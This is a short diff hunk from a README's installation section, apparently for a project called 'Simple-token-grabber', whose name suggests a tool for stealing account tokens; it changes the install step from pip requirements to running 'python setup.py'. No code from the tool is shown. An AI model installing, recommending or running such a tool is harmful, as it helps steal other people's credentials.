@@ -39,7 +39,7 @@ Example output:
 https://github.com/SinLimerence/Simple-token-grabber.git
 
 2. Install required dependencies:
-pip install -r requirements.txt
+python setup.py
 
 
 ## 📚 Usage
